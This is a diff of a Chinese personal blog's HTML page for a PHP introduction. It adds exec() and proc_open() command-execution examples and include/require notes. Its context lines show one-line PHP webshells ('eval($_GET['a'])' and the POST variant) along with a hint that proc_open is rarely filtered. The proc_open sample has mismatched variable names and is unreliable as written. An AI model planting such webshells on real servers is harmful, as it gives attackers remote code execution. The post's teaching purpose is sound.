@@ -130,7 +130,7 @@
   
   <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2018/12/12/Back-end/">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2018/12/12/PHP/">
       <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
         <meta itemprop="name" content="TuringGu">
         <meta itemprop="description" content="">
@@ -142,7 +142,7 @@
     </div>
     <header class="post-header">
       <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2018/12/12/Back-end/" itemprop="url">后端开发入门</a>
+        <a class="post-title-link post-title-link-external" href="/2018/12/12/PHP/" itemprop="url">PHP开发入门</a>
       </h1>
       <div class="post-meta">
         
@@ -156,7 +156,7 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文主要为后端开发做个引子，对常见的或者常用的知识做个简介，包括PHP、MySQL等一些入门级知识。</p>
+      <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文主要为后端开发做个引子，对常见的或者常用的知识做个简介，包括PHP等一些入门级知识。</p>
 <p><strong>注：补充知识放在文末</strong></p>
 <hr>
 <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><ul>
@@ -363,9 +363,18 @@
 <hr>
 <h3 id="简单命令执行"><a href="#简单命令执行" class="headerlink" title="简单命令执行"></a>简单命令执行</h3><p>PHP中执行PHP代码<br><code>eval()、assert()</code></p>
 <p>PHP中执行系统命令：<br><code>system()</code> 输出并返回最后一行<code>shell</code>结果<br><code>exec()</code> 不输出结果，返回最后一行<code>shell</code>结果，所有结果可以保存到一个返回的数组里面<br><code>passthru()</code> 只调用命令，把命令的运行结果原样直接输出至标准输出设备上</p>
-<p>其他：<br><code>popen()、shell_exec()、proc_open()、pcntl_exec()</code></p>
+<p>其他：<br><code>popen()、shell_exec()、proc_open()、pcntl_exec()</code><br>反引号实际上使用的shell_exec</p>
+<p>一些例子：<br><code>exec()</code>：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">exec(<span class="hljs-string">'dir'</span>, $a);  <span class="hljs-comment">// exec返回值是一个数组</span><br><span class="hljs-keyword">foreach</span> ($a <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">echo</span> $value.<span class="hljs-string">"&lt;br&gt;"</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p><code>proc_open</code>（很少被过滤）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">$arrayName = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),<br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),<br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"file"</span>, <span class="hljs-string">"./tmp-error-output.txt"</span>, <span class="hljs-string">"a"</span>)<br>);<br><br>proc_open(<span class="hljs-string">'dir'</span>, $array, $pipes);<br><span class="hljs-keyword">foreach</span> ($pipes <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">while</span>(!feof($value)) &#123;<br>        <span class="hljs-keyword">echo</span> fgets($file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p>
 <h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>PHP脚本版：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
 <p>Java脚本版（C🔪）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="文件的包含"><a href="#文件的包含" class="headerlink" title="文件的包含"></a>文件的包含</h3><h4 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h4><p>通过include或require语句，可将PHP文件的内容插入另一个PHP文件（在服务器执行它之前）<br>异同：</p>
+<blockquote>
+<p><code>include</code>和<code>require</code>语句是相同的，除了错误处理方面：<br><code>require</code>会生成致命错误<code>E_COMPILE_ERROR</code>并停止脚本<br><code>include</code>只生成警告<code>E_WARNING</code>，并且脚本会继续<br><code>include_once</code>和<code>requre_once</code>语句相同，也是除了错误处理方面有所不同，同时，他们只会包含此次，不会重复包含。</p>
+</blockquote>
+<hr>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// include会在php文件开始运行的时候包含</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// require会在php文件运行到require关键字时包含</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">'filename'</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">'filenmae'</span>;<br></code></pre></td></tr></table></figure>
 <hr>
 <h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h3><ol>
 <li><p>解释型语言</p>
@@ -410,7 +419,7 @@
         
         <a class="post-tag button" href="/tags/PHP/" rel="tag"><i class="fas fa-tags"></i>PHP</a>
         
-        <a class="post-tag button" href="/tags/MySQL/" rel="tag"><i class="fas fa-tags"></i>MySQL</a>
+        <a class="post-tag button" href="/tags/Back-end/" rel="tag"><i class="fas fa-tags"></i>Back-end</a>
         
       </div>
       
@@ -419,7 +428,7 @@
   
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fas fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/7/"><i class="fas fa-angle-right" aria-label="下一页"></i></a>
   </nav>
   
   
@@ -449,7 +458,7 @@
     
     <div class="archives-count">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">14</a></div>
+      <div><a href="/archives/">15</a></div>
     </div>
     
     
@@ -467,7 +476,7 @@
     
     <div class="tags-count">
       <div class="site-count-title">标签</div>
-      <div><a href="/tags/">27</a></div>
+      <div><a href="/tags/">29</a></div>
     </div>
     
   </div>
